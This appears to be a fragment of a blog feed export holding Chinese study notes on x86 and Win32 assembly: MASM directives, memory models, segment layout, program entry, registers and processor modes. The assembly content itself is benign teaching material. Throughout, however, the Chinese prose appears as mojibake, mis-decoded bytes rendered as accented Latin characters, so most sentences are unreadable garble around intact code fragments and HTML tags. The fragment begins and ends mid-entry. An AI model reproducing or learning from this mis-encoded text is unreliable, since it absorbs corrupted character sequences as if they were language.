.586/.586p</code>ç­‰ã€‚åé¢å¸¦<strong>p</strong>çš„ä¼ªæŒ‡ä»¤è¡¨ç¤ºç¨‹åºä¸­å¯ä»¥ä½¿ç”¨<strong>ç‰¹æƒæŒ‡ä»¤(å¿…é¡»åœ¨ç‰¹æƒçº§0ä¸Šè¿è¡Œçš„æŒ‡ä»¤)</strong>å¦‚ï¼š<code>mov cr0, eax</code></p><h4 id="2-1-2-modelè¯­å¥"><a href="#2-1-2-modelè¯­å¥" class="headerlink" title="2.1.2 .modelè¯­å¥"></a>2.1.2 .modelè¯­å¥</h4><p>ç”¨æ¥å®šä¹‰ç¨‹åºå·¥ä½œçš„æ¨¡å¼ã€‚ç”¨æ³•å¦‚ä¸‹ï¼š</p><p><code>.model å†…å­˜æ¨¡å¼ [, è¯­è¨€æ¨¡å¼] [, å…¶ä»–æ¨¡å¼]</code></p><div class="table-container"><table><thead><tr><th>æ¨¡å¼</th><th>å†…å­˜ä½¿ç”¨æ–¹å¼</th></tr></thead><tbody><tr><td>tiny</td><td>ç”¨æ¥å»ºç«‹ .comæ–‡ä»¶ï¼Œæ‰€æœ‰ä»£ç ã€æ•°æ®å’Œå †æ ˆéƒ½åœ¨åŒä¸€ä¸ª64KBæ®µå†…</td></tr><tr><td>small</td><td>å»ºç«‹ä»£ç å’Œæ•°æ®åˆ†åˆ«åˆ«ç”¨ä¸€ä¸ª64KBæ®µçš„ .exeæ–‡ä»¶</td></tr><tr><td>medium</td><td>ä»£ç æ®µå¯ä»¥æœ‰å¤šä¸ª64KBæ®µï¼Œæ•°æ®æ®µåªæœ‰ä¸€ä¸ª64KBæ®µ</td></tr><tr><td>compact</td><td>ä»£ç æ®µåªæœ‰ä¸€ä¸ª64KBæ®µï¼Œæ•°æ®æ®µå¯ä»¥æœ‰å¤šä¸ª64KBæ®µ</td></tr><tr><td>large</td><td>ä»£ç æ®µå’Œæ•°æ®æ®µéƒ½å¯ä»¥ç”±å¤šä¸ª64KBæ®µ</td></tr><tr><td>huge</td><td>åŒlargeï¼Œå¹¶ä¸”æ•°æ®æ®µä¸­çš„ä¸€ä¸ªæ•°ç»„ä¹Ÿå¯ä»¥è¶…è¿‡64KB</td></tr><tr><td><strong>flat</strong></td><td><strong>Win32ç¨‹åºä½¿ç”¨çš„æ¨¡å¼ï¼Œä»£ç å’Œæ•°æ®æ®µä½¿ç”¨åŒä¸€ä¸ª4GBæ®µ</strong></td></tr></tbody></table></div><p>å¯¹äºè¿è¡Œåœ¨<strong>ä¿æŠ¤æ¨¡å¼</strong>ä¸‹çš„win32ç¨‹åºï¼Œå®ƒåªæœ‰ä¸€ç§å†…å­˜æ¨¡å¼â€”â€”flatæ¨¡å¼ï¼Œå³æ¯ä¸€ä¸ªåº”ç”¨ç¨‹åºéƒ½æ‹¥æœ‰å…¶ç›¸äº’ç‹¬ç«‹çš„4GBåœ°å€ç©ºé—´ã€‚</p><h4 id="2-1-3-optionè¯­å¥"><a href="#2-1-3-optionè¯­å¥" class="headerlink" title="2.1.3 optionè¯­å¥"></a>2.1.3 optionè¯­å¥</h4><p><code>option casemap:none</code>ï¼Œè¯¥è¯­å¥å®šä¹‰äº†ç¨‹åºä¸­å˜é‡å’Œå­ç¨‹åºåæ˜¯å¦å¯¹å¤§å°å†™æ•æ„Ÿã€‚ç”±äºWin32 APIåç§°æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œæ•…<strong>åœ¨win32æ±‡ç¼–ç¨‹åºä¸­å¿…é¡»æŒ‡å®šæ­¤è¯­å¥</strong>ã€‚</p><h3 id="2-2-æ®µçš„å®šä¹‰"><a href="#2-2-æ®µçš„å®šä¹‰" class="headerlink" title="2.2 æ®µçš„å®šä¹‰"></a>2.2 æ®µçš„å®šä¹‰</h3><h4 id="2-2-1-æ®µçš„æ¦‚å¿µ"><a href="#2-2-1-æ®µçš„æ¦‚å¿µ" class="headerlink" title="2.2.1 æ®µçš„æ¦‚å¿µ"></a>2.2.1 æ®µçš„æ¦‚å¿µ</h4><p>ä¸€ä¸ªåŒ…å«å…¨éƒ¨æ®µçš„æºç¨‹åºç»“æ„ï¼š</p><pre><code class="hljs asm">.386.model flat, stdcalloption casemap:none&lt;include statements&gt;.stack [å †æ ˆæ®µçš„å¤§å°].data&lt;ä¸€äº›åˆå§‹åŒ–è¿‡çš„å˜é‡å®šä¹‰&gt;.data?&lt;ä¸€äº›æ²¡æœ‰åˆå§‹åŒ–è¿‡çš„å˜é‡å®šä¹‰&gt;.const&lt;ä¸€äº›å¸¸é‡å®šä¹‰&gt;.code&lt;ä»£ç &gt;&lt;å¼€å§‹æ ‡å·&gt;    &lt;è¯­å¥&gt;end å¼€å§‹æ ‡å·</code></pre><ul><li>å…¶ä¸­.stack, .data, .data?, .constå’Œ.codeéƒ½æ˜¯åˆ†æ®µä¼ªæŒ‡ä»¤ã€‚</li><li>Win32åªæœ‰ä»£ç å’Œæ•°æ®æ®µä¹‹åˆ†ï¼Œå› æ­¤.data, .data?å’Œ.constå±äºæ•°æ®æ®µï¼Œ.codeå±äºä»£ç æ®µã€‚</li><li>ä¸DOSæ±‡ç¼–ä¸åŒï¼ŒWin32æ±‡ç¼–ä¸å¿…è€ƒè™‘å †æ ˆï¼Œ.stackæ®µå®šä¹‰å¸¸å¸¸è¢«å¿½ç•¥ã€‚</li></ul><h4 id="2-2-2-æ•°æ®æ®µ"><a href="#2-2-2-æ•°æ®æ®µ" class="headerlink" title="2.2.2 æ•°æ®æ®µ"></a>2.2.2 æ•°æ®æ®µ</h4><p>.dataï¼Œ.data?å’Œ.constå®šä¹‰åœ¨æ•°æ®æ®µï¼Œåˆ†åˆ«å¯¹åº”ä¸åŒæ–¹å¼çš„æ•°æ®å®šä¹‰ï¼Œåœ¨æœ€åç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ä¹Ÿæ”¾ç½®åœ¨ä¸åŒçš„èŠ‚åŒº(Section)ã€‚ç¨‹åºä¸­çš„æ•°æ®å®šä¹‰ä¸€èˆ¬å¯ä»¥å½’çº³ä¸ºä¸‰ç±»ï¼š</p><ol><li>å¯è¯»å¯å†™çš„å·²å®šä¹‰å˜é‡ã€‚è¢«å®šä¹‰åœ¨.dataæ®µï¼Œå…·æœ‰ä»¥ä¸‹æ€§è´¨ï¼š<ul><li>åœ¨æºç¨‹åºå·²ç»è¢«å®šä¹‰äº†åˆå§‹å€¼ã€‚</li><li>å…·æœ‰å¯è¯»å¯å†™æ€§ã€‚</li><li>åœ¨ç¨‹åºè£…å…¥å®Œæˆä¹‹åï¼Œè¿™äº›å€¼å­˜åœ¨äºå†…å­˜ä¸­ã€‚</li><li>.dataæ®µä¸€èˆ¬å­˜æ”¾åœ¨å¯æ‰§è¡Œæ–‡ä»¶çš„_DATAèŠ‚åŒºå†…ã€‚</li></ul></li><li>å¯è¯»å¯å†™çš„æœªå®šä¹‰å˜é‡ã€‚å¯å®šä¹‰åœ¨.dataæ®µï¼Œä¹Ÿå¯ä»¥å®šä¹‰åœ¨.data?æ®µï¼Œå…·æœ‰ä»¥ä¸‹æ€§è´¨ï¼š<ul><li>ä¸€èˆ¬ç”¨ä½œç¼“å†²åŒºï¼Œæˆ–è€…ç¨‹åºæ‰§è¡Œååœ¨å¼€å§‹ä½¿ç”¨ã€‚</li><li>è‹¥å®šä¹‰åœ¨.dataæ®µï¼Œåˆ™ç¼–è¯‘å™¨åœ¨ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶æ—¶ä¼šä¿ç•™å£°æ˜å¤§å°çš„ç©ºé—´ï¼Œå³ä½¿å®ƒä»¬æ˜¯å…¨0</li><li>è‹¥å®šä¹‰åœ¨.data?æ®µï¼Œåˆ™ç¼–è¯‘å™¨åœ¨ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶æ—¶åªä¼šè®°å½•ç©ºé—´å¤§å°ä¿¡æ¯ï¼Œä¸ä¼šæµªè´¹ç£ç›˜ç©ºé—´ï¼Œè€Œæ˜¯åœ¨ç¨‹åºæ‰§è¡Œæ—¶æ‰ä¼šç”¨åˆ°ã€‚</li><li>.data?æ®µåœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ä¸€èˆ¬æ”¾åœ¨_BSSèŠ‚åŒºã€‚</li></ul></li><li>å¸¸é‡ã€‚å¦‚ä¸€äº›è¦æ˜¾ç¤ºçš„å­—ç¬¦ä¸²ä¿¡æ¯ã€‚<ul><li>å®ƒä»¬åœ¨ç¨‹åºè£…å…¥æ—¶å°±å·²ç»æœ‰æ•ˆï¼Œä½†åœ¨æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹ä¸­ä¸éœ€è¦ä¿®æ”¹ã€‚</li><li>å…·æœ‰å¯è¯»ä¸å¯å†™æ€§ã€‚</li><li>å¦‚æœç¨‹åºå¯¹.constæ®µè¿›è¡Œå†™æ“ä½œï¼Œä¼šå¼•èµ·ä¿æŠ¤é”™è¯¯å¹¶ç»“æŸç¨‹åºã€‚</li></ul></li></ol><h4 id="2-2-3-ä»£ç æ®µ"><a href="#2-2-3-ä»£ç æ®µ" class="headerlink" title="2.2.3 ä»£ç æ®µ"></a>2.2.3 ä»£ç æ®µ</h4><ul><li>.codeæ®µæ—¶ä»£ç æ®µï¼Œæ‰€æœ‰çš„æŒ‡ä»¤éƒ½å¿…é¡»å†™åœ¨ä»£ç æ®µä¸­</li><li>åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œä»£ç æ®µä¸€èˆ¬æ”¾åœ¨_TEXTèŠ‚åŒºã€‚</li><li>Win32ç¯å¢ƒä¸‹çš„æ•°æ®æ®µæ˜¯ä¸å¯æ‰§è¡Œçš„ï¼Œåªæœ‰ä»£ç æ®µæœ‰å¯æ‰§è¡Œçš„å±æ€§ã€‚ï¼ˆç‰¹æƒçº§0ä¸‹è¿è¡Œçš„ç¨‹åºå¯¹æ‰€æœ‰æ®µæœ‰è¯»å†™æƒé™ï¼‰</li></ul><h4 id="2-2-4-å †æ ˆæ®µ"><a href="#2-2-4-å †æ ˆæ®µ" class="headerlink" title="2.2.4 å †æ ˆæ®µ"></a>2.2.4 å †æ ˆæ®µ</h4><ul><li>Win32ç¨‹åºä¸­ä¸å¿…å®šä¹‰å †æ ˆæ®µï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ†é…å †æ ˆç©ºé—´ã€‚</li><li>å †æ ˆæ®µçš„å†…å­˜å±æ€§æ˜¯å¯è¯»å†™å¹¶å¯æ‰§è¡Œçš„ã€‚ï¼ˆé åŠ¨æ€ä¿®æ”¹ä»£ç çš„åè·Ÿè¸ªæ¨¡å—å¯ä»¥æ‹·è´åˆ°å †æ ˆä¸­è¾¹ä¿®æ”¹è¾¹æ‰§è¡Œï¼‰</li></ul><h3 id="2-3-ç¨‹åºå…¥å£ä¸ç»“æŸ"><a href="#2-3-ç¨‹åºå…¥å£ä¸ç»“æŸ" class="headerlink" title="2.3 ç¨‹åºå…¥å£ä¸ç»“æŸ"></a>2.3 ç¨‹åºå…¥å£ä¸ç»“æŸ</h3><ul><li>æ±‡ç¼–æºç¨‹åºä¸­ï¼Œå¹¶æ²¡æœ‰mainå‡½æ•°æ¥æŒ‡å®šå¼€å§‹æ‰§è¡Œçš„åœ°æ–¹ã€‚å–è€Œä»£ä¹‹çš„æ˜¯ç¨‹åºçš„æœ€åä¸€å¥çš„endè¯­å¥<code>end     [å¼€å§‹åœ°å€]</code></li><li>ä¸Šè¿°è¯­å¥çš„å¼€å§‹åœ°å€å°±æ˜¯æºç¨‹åºä»ä»£ç æ®µå¼€å§‹æ‰§è¡Œçš„åœ°å€ã€‚</li><li>ä¸Šè¿°è¯­å¥åŒæ—¶è¿˜è¡¨ç¤ºæºç¨‹åºç»“æŸï¼Œæ‰€æœ‰ä»£ç éƒ½å¿…é¡»åœ¨endè¯­å¥ä¹‹å‰ã€‚</li><li><strong>å¤šæ¨¡å—ç¨‹åºç¼–å†™æ—¶ï¼Œå•ä¸€çš„æ¨¡å—å¯ä»¥æ²¡æœ‰å…¥å£æ ‡å·ï¼Œä½†æ˜¯æœ€åæŠŠå¤šä¸ªæ¨¡å—è¿æ¥åœ¨ä¸€èµ·æ—¶ï¼Œå¿…é¡»æœ‰ä¸€ä¸ªä¸»æ¨¡å—çš„å…¥å£åœ°å€è¢«æŒ‡æ˜ã€‚</strong></li></ul><h2 id="3-APIçš„è°ƒç”¨"><a href="#3-APIçš„è°ƒç”¨" class="headerlink" title="3 APIçš„è°ƒç”¨"></a>3 APIçš„è°ƒç”¨</h2><h3 id="3-1-APIæ˜¯ä»€ä¹ˆ"><a href="#3-1-APIæ˜¯ä»€ä¹ˆ" class="headerlink" title="3.1 APIæ˜¯ä»€ä¹ˆ"></a>3.1 APIæ˜¯ä»€ä¹ˆ</h3><h3 id="3-2-å¦‚ä½•è°ƒç”¨"><a href="#3-2-å¦‚ä½•è°ƒç”¨" class="headerlink" title="3.2 å¦‚ä½•è°ƒç”¨"></a>3.2 å¦‚ä½•è°ƒç”¨</h3><h4 id="3-3-1-invokeè¯­å¥"><a href="#3-3-1-invokeè¯­å¥" class="headerlink" title="3.3.1 invokeè¯­å¥"></a>3.3.1 invokeè¯­å¥</h4><h4 id="3-3-2-å‡½æ•°çš„å£°æ˜ä¸è¿”å›å€¼"><a href="#3-3-2-å‡½æ•°çš„å£°æ˜ä¸è¿”å›å€¼" class="headerlink" title="3.3.2 å‡½æ•°çš„å£°æ˜ä¸è¿”å›å€¼"></a>3.3.2 å‡½æ•°çš„å£°æ˜ä¸è¿”å›å€¼</h4><h4 id="3-3-3-includeè¯­å¥"><a href="#3-3-3-includeè¯­å¥" class="headerlink" title="3.3.3 includeè¯­å¥"></a>3.3.3 includeè¯­å¥</h4>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>x86 Assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86æ±‡ç¼–å­¦ä¹ ç¬”è®°(ä¸€)</title>
    <link href="/2019/09/30/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/"/>
    <url>/2019/09/30/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦ä»‹ç»äº†80x86çš„å¯„å­˜å™¨ï¼Œ80x86å¤„ç†å™¨çš„å·¥ä½œæ¨¡å¼ï¼ŒWindowsçš„å†…å­˜ç®¡ç†å’Œå¯»å€æ–¹å¼ã€‚</p><span id="more"></span><h2 id="1-80386çš„å¯„å­˜å™¨"><a href="#1-80386çš„å¯„å­˜å™¨" class="headerlink" title="1 80386çš„å¯„å­˜å™¨"></a>1 80386çš„å¯„å­˜å™¨</h2><h3 id="1-1-é€šç”¨å¯„å­˜å™¨"><a href="#1-1-é€šç”¨å¯„å­˜å™¨" class="headerlink" title="1.1 é€šç”¨å¯„å­˜å™¨"></a>1.1 é€šç”¨å¯„å­˜å™¨</h3><ul><li><strong>EAX:</strong> é€šç”¨å¯„å­˜å™¨ã€‚ç›¸å¯¹å…¶ä»–å¯„å­˜å™¨ï¼Œåœ¨è¿›è¡Œè¿ç®—æ–¹é¢æ¯”è¾ƒå¸¸ç”¨ã€‚åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå†…å­˜åç§»æŒ‡é’ˆï¼ˆæ­¤æ—¶ï¼ŒDSä½œä¸ºæ®µå¯„å­˜å™¨æˆ–é€‰æ‹©å™¨ï¼‰</li><li><strong>EBX:</strong> é€šç”¨å¯„å­˜å™¨ã€‚é€šå¸¸ä½œä¸ºå†…å­˜åç§»æŒ‡é’ˆä½¿ç”¨ï¼ˆç›¸å¯¹äºEAXã€ECXã€EDXï¼‰ã€‚åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼ŒåŒæ ·å¯ä»¥èµ·è¿™ä¸ªä½œç”¨ã€‚</li><li><strong>ECX:</strong> é€šç”¨å¯„å­˜å™¨ã€‚é€šå¸¸ç”¨äºç‰¹å®šæŒ‡ä»¤çš„è®¡æ•°ã€‚åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå†…å­˜åç§»æŒ‡é’ˆï¼ˆæ­¤æ—¶ï¼ŒDSä½œä¸ºå¯„å­˜å™¨æˆ–æ®µé€‰æ‹©å™¨ï¼‰ã€‚</li><li><strong>EDX:</strong> é€šç”¨å¯„å­˜å™¨ã€‚åœ¨æŸäº›è¿ç®—ä¸­ä½œä¸ºEAXçš„æº¢å‡ºå¯„å­˜å™¨ï¼ˆä¾‹å¦‚ä¹˜ã€é™¤ï¼‰ã€‚åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå†…å­˜åç§»æŒ‡é’ˆï¼ˆæ­¤æ—¶ï¼ŒDSä½œä¸ºæ®µ å¯„å­˜å™¨æˆ–é€‰æ‹©å™¨ï¼‰ã€‚</li></ul><p><strong>æ³¨ï¼š</strong>ä»¥ä¸Šå››ä¸ªå¯„å­˜å™¨å‡ä¸º32ä½ï¼Œä¸”å…·æœ‰16-bitå’Œ8-bitçš„åˆ†ç»„ã€‚å³æˆ‘ä»¬å¯ä»¥é€šè¿‡AXæ¥è®¿é—®EAXçš„ä½16ä½ï¼Œé€šè¿‡AHå’ŒALæ¥è®¿é—®AXçš„é«˜8ä½å’Œä½8ä½ã€‚</p><ul><li><strong>ESI:</strong> é€šå¸¸åœ¨å†…å­˜æ“ä½œæŒ‡ä»¤ä¸­ä½œä¸ºâ€œæºåœ°å€æŒ‡é’ˆâ€ä½¿ç”¨ã€‚å½“ç„¶ï¼ŒESIå¯ä»¥è¢«è£…å…¥ä»»æ„çš„æ•°å€¼ï¼Œä½†é€šå¸¸æ²¡æœ‰äººæŠŠå®ƒå½“ä½œé€šç”¨å¯„å­˜å™¨æ¥ç”¨ã€‚</li><li><strong>EDI:</strong> é€šå¸¸åœ¨å†…å­˜æ“ä½œæŒ‡ä»¤ä¸­ä½œä¸ºâ€œç›®çš„åœ°å€æŒ‡é’ˆâ€ä½¿ç”¨ã€‚å½“ç„¶ï¼ŒEDIä¹Ÿå¯ä»¥è¢«è£…å…¥ä»»æ„çš„æ•°å€¼ï¼Œä½†é€šå¸¸æ²¡æœ‰äººæŠŠå®ƒå½“ä½œé€šç”¨å¯„å­˜å™¨æ¥ç”¨ã€‚</li><li><strong>EBP:</strong> ä¸€ä¸ªæŒ‡é’ˆçš„å¯„å­˜å™¨ã€‚é€šå¸¸ï¼Œå®ƒè¢«é«˜çº§è¯­è¨€ç¼–è¯‘å™¨ç”¨ä»¥å»ºé€ â€˜å †æ ˆå¸§â€™æ¥ä¿å­˜å‡½æ•°æˆ–è¿‡ç¨‹çš„å±€éƒ¨å˜é‡ï¼Œä¸è¿‡ï¼Œè¿˜æ˜¯é‚£å¥è¯ï¼Œä½ å¯ä»¥åœ¨å…¶ä¸­ä¿å­˜ä½ å¸Œæœ›çš„ä»»ä½•æ•°æ®ã€‚SSæ˜¯å®ƒçš„é»˜è®¤æ®µå¯„å­˜å™¨æˆ–é€‰æ‹©å™¨ã€‚</li></ul><p><strong>æ³¨ï¼š</strong>ä»¥ä¸Šä¸‰ä¸ªå¯„å­˜å™¨ä¹Ÿæ˜¯32ä½å¯„å­˜å™¨ï¼Œä½†æ˜¯<strong>æ²¡æœ‰8-bitåˆ†ç»„</strong>ã€‚</p><h3 id="1-2-æ®µå¯„å­˜å™¨å’Œé€‰æ‹©å™¨"><a href="#1-2-æ®µå¯„å­˜å™¨å’Œé€‰æ‹©å™¨" class="headerlink" title="1.2 æ®µå¯„å­˜å™¨å’Œé€‰æ‹©å™¨"></a>1.2 æ®µå¯„å­˜å™¨å’Œé€‰æ‹©å™¨</h3><ul><li><strong>CS:</strong> ä»£ç æ®µï¼Œæˆ–ä»£ç é€‰æ‹©å™¨ã€‚åŒIPå¯„å­˜å™¨ä¸€åŒæŒ‡å‘å½“å‰æ­£åœ¨æ‰§è¡Œçš„é‚£ä¸ªåœ°å€ã€‚å¤„ç†å™¨æ‰§è¡Œæ—¶ä»è¿™ä¸ªå¯„å­˜å™¨æŒ‡å‘çš„æ®µï¼ˆå®æ¨¡å¼ï¼‰æˆ–å†…å­˜ï¼ˆä¿æŠ¤æ¨¡å¼ï¼‰ä¸­è·å–æŒ‡ä»¤ã€‚é™¤äº†è·³è½¬æˆ–å…¶ä»–åˆ†æ”¯æŒ‡ä»¤ä¹‹å¤–ï¼Œä½ æ— æ³•ä¿®æ”¹è¿™ä¸ªå¯„å­˜å™¨çš„å†…å®¹ã€‚</li><li><strong>DS:</strong> æ•°æ®æ®µï¼Œæˆ–æ•°æ®é€‰æ‹©å™¨ã€‚è¿™ä¸ªå¯„å­˜å™¨çš„ä½16 bitè¿åŒESIä¸€åŒæŒ‡å‘çš„æŒ‡ä»¤å°†è¦å¤„ç†çš„å†…å­˜ã€‚åŒæ—¶ï¼Œæ‰€æœ‰çš„å†…å­˜æ“ä½œæŒ‡ä»¤ é»˜è®¤æƒ…å†µä¸‹éƒ½ç”¨å®ƒæŒ‡å®šæ“ä½œæ®µ(å®æ¨¡å¼)æˆ–å†…å­˜(ä½œä¸ºé€‰æ‹©å™¨ï¼Œåœ¨ä¿æŠ¤æ¨¡å¼)ã€‚</li><li><strong>ES:</strong> é™„åŠ æ®µï¼Œæˆ–é™„åŠ é€‰æ‹©å™¨ã€‚è¿™ä¸ªå¯„å­˜å™¨çš„ä½16 bitè¿åŒEDIä¸€åŒæŒ‡å‘çš„æŒ‡ä»¤å°†è¦å¤„ç†çš„å†…å­˜ã€‚åŒæ ·çš„ï¼Œè¿™ä¸ªå¯„å­˜å™¨å¯ä»¥è¢«è£…å…¥ä»»æ„æ•°å€¼ï¼Œæ–¹æ³•å’ŒDSç±»ä¼¼ã€‚</li><li><strong>FS: </strong>Fæ®µæˆ–Fé€‰æ‹©å™¨(æ¨æµ‹Få¯èƒ½æ˜¯Free?)ã€‚å¯ä»¥ç”¨è¿™ä¸ªå¯„å­˜å™¨ä½œä¸ºé»˜è®¤æ®µå¯„å­˜å™¨æˆ–é€‰æ‹©å™¨çš„ä¸€ä¸ªæ›¿ä»£å“ã€‚å®ƒå¯ä»¥è¢«è£…å…¥ä»»ä½•æ•°å€¼ï¼Œæ–¹æ³•å’ŒDSç±»ä¼¼ã€‚</li><li><strong>GS:</strong> Gæ®µæˆ–Gé€‰æ‹©å™¨(Gçš„æ„ä¹‰å’ŒFä¸€æ ·ï¼Œæ²¡æœ‰åœ¨Intelçš„æ–‡æ¡£ä¸­è§£é‡Š)ã€‚å®ƒå’ŒFSå‡ ä¹å®Œå…¨ä¸€æ ·ã€‚</li><li><strong>SS:</strong> å †æ ˆæ®µæˆ–å †æ ˆé€‰æ‹©å™¨ã€‚è¿™ä¸ªå¯„å­˜å™¨çš„ä½16 bitè¿åŒESPä¸€åŒæŒ‡å‘ä¸‹ä¸€æ¬¡å †æ ˆæ“ä½œ(pushå’Œpop)æ‰€è¦ä½¿ç”¨çš„å †æ ˆåœ°å€ã€‚è¿™ä¸ªå¯„å­˜å™¨ä¹Ÿå¯ä»¥è¢«è£…å…¥ä»»æ„æ•°å€¼ï¼Œä½ å¯ä»¥é€šè¿‡å…¥æ ˆå’Œå‡ºæ ˆæ“ä½œæ¥ç»™ä»–èµ‹å€¼ï¼Œä¸è¿‡ç”±äºå †æ ˆå¯¹äºå¾ˆå¤šæ“ä½œæœ‰å¾ˆé‡è¦çš„æ„ä¹‰ï¼Œå› æ­¤ï¼Œä¸æ­£ç¡®çš„ä¿®æ”¹æœ‰å¯èƒ½é€ æˆå¯¹å †æ ˆçš„ç ´åã€‚</li></ul><p><strong>æ³¨ï¼š</strong>æ®µå¯„å­˜å™¨å’Œé€‰æ‹©å™¨åœ¨æ²¡æœ‰åˆ¶å®šçš„æƒ…å†µä¸‹éƒ½æ˜¯ä½¿ç”¨é»˜è®¤å¯¹åº”çš„å¯„å­˜å™¨ã€‚</p><h3 id="1-3-ç‰¹æ®Šå¯„å­˜å™¨"><a href="#1-3-ç‰¹æ®Šå¯„å­˜å™¨" class="headerlink" title="1.3 ç‰¹æ®Šå¯„å­˜å™¨"></a>1.3 ç‰¹æ®Šå¯„å­˜å™¨</h3><ul><li><strong>EIP:</strong> ä¸€ä¸ª32ä½å®½çš„å¯„å­˜å™¨ ï¼ŒåŒCSä¸€åŒæŒ‡å‘å³å°†æ‰§è¡Œçš„é‚£æ¡æŒ‡ä»¤çš„åœ°å€ã€‚ä¸èƒ½å¤Ÿç›´æ¥ä¿®æ”¹è¿™ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œä¿®æ”¹å®ƒçš„å”¯ä¸€æ–¹æ³•æ˜¯è·³è½¬æˆ–åˆ†æ”¯æŒ‡ä»¤ã€‚(CSæ˜¯é»˜è®¤çš„æ®µæˆ–é€‰æ‹©å™¨)</li><li><strong>ESP:</strong> è¿™ä¸ª32ä½å¯„å­˜å™¨æŒ‡å‘<strong>å †æ ˆ</strong>ä¸­<strong>å³å°†è¢«æ“ä½œçš„é‚£ä¸ªåœ°å€</strong>ã€‚å°½ç®¡å¯ä»¥ä¿®æ”¹å®ƒçš„å€¼ï¼Œç„¶è€Œå¹¶ä¸æå€¡è¿™æ ·åšï¼Œå› ä¸ºå¦‚æœä½ ä¸æ˜¯éå¸¸æ˜ç™½è‡ªå·±åœ¨åšä»€ä¹ˆï¼Œé‚£ä¹ˆä½ å¯èƒ½é€ æˆå †æ ˆçš„ç ´åã€‚å¯¹äºç»å¤§å¤šæ•°æƒ…å†µè€Œè¨€ï¼Œè¿™å¯¹ç¨‹åºæ˜¯è‡´å‘½çš„ã€‚(SSæ˜¯é»˜è®¤çš„æ®µæˆ–é€‰æ‹©å™¨)</li></ul><h3 id="1-4-å…¶ä»–å¯„å­˜å™¨"><a href="#1-4-å…¶ä»–å¯„å­˜å™¨" class="headerlink" title="1.4 å…¶ä»–å¯„å­˜å™¨"></a>1.4 å…¶ä»–å¯„å­˜å™¨</h3><p><em>ä»¥ä¸‹å¯„å­˜å™¨å‡ä¸º32ä½</em></p><ul><li><strong>CR0, CR2, CR3:</strong> æ§åˆ¶å¯„å­˜å™¨ã€‚å…¶ä¸­CR0çš„ä½œç”¨æ˜¯åˆ‡æ¢å®æ¨¡å¼å’Œä¿æŠ¤æ¨¡å¼</li><li><strong>D0, D1, D2, D3, D6, D7:</strong> è°ƒè¯•å¯„å­˜å™¨ã€‚å¯ä»¥ä½œä¸ºè°ƒè¯•å™¨çš„ç¡¬ä»¶æ”¯æŒæ¥è®¾ç½®æ¡ä»¶æ–­ç‚¹</li><li><strong>TR3, TR4, TR5, TR6:</strong> æµ‹è¯•å¯„å­˜å™¨ã€‚ç”¨äºæŸäº›æ¡ä»¶æµ‹è¯•</li></ul><h2 id="2-80x86çš„å·¥ä½œæ¨¡å¼"><a href="#2-80x86çš„å·¥ä½œæ¨¡å¼" class="headerlink" title="2 80x86çš„å·¥ä½œæ¨¡å¼"></a>2 80x86çš„å·¥ä½œæ¨¡å¼</h2><p>80386å¤„ç†å™¨ç”±ä¸‰ä¸ªå·¥ä½œæ¨¡å¼ï¼šå®æ¨¡å¼ï¼Œä¿æŠ¤æ¨¡å¼å’Œè™šæ‹Ÿ86æ¨¡å¼ã€‚å®æ¨¡å¼å’Œè™šæ‹Ÿ86æ¨¡å¼éƒ½æ˜¯ä¸ºäº†å’Œ8086å¤„ç†å™¨<strong>å…¼å®¹</strong>è€Œè®¾ç½®çš„ã€‚</p><h3 id="2-1-å®æ¨¡å¼"><a href="#2-1-å®æ¨¡å¼" class="headerlink" title="2.1 å®æ¨¡å¼"></a>2.1 å®æ¨¡å¼</h3><ul><li>80386å¤„ç†å™¨è¢«å¤ä½æˆ–åŠ ç”µçš„æ—¶å€™ä»¥å®æ¨¡å¼å¯åŠ¨ã€‚è¿™æ—¶å€™å¤„ç†å™¨ä¸­çš„å„å¯„å­˜å™¨ä»¥å®æ¨¡å¼çš„åˆå§‹åŒ–å€¼å·¥ä½œã€‚</li><li>80386å¤„ç†å™¨åœ¨å®æ¨¡å¼ä¸‹çš„å­˜å‚¨å™¨å¯»å€æ–¹å¼å’Œ8086æ˜¯ä¸€æ ·çš„ï¼šç”±æ®µå¯„å­˜å™¨çš„å†…å®¹ä¹˜ä»¥16å½“ä½œåŸºåœ°å€ï¼ŒåŠ 